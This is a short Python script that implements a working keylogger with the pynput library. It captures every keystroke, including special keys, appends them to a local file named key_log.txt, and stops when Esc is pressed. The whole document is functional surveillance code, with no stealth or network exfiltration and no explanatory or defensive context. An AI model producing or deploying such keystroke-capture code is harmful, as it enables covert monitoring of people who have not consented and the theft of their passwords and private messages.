from pynput import keyboard

# Specify the file where the logs will be saved
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Record the key pressed
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f' [{key}] ')

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when Esc key is pressed
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


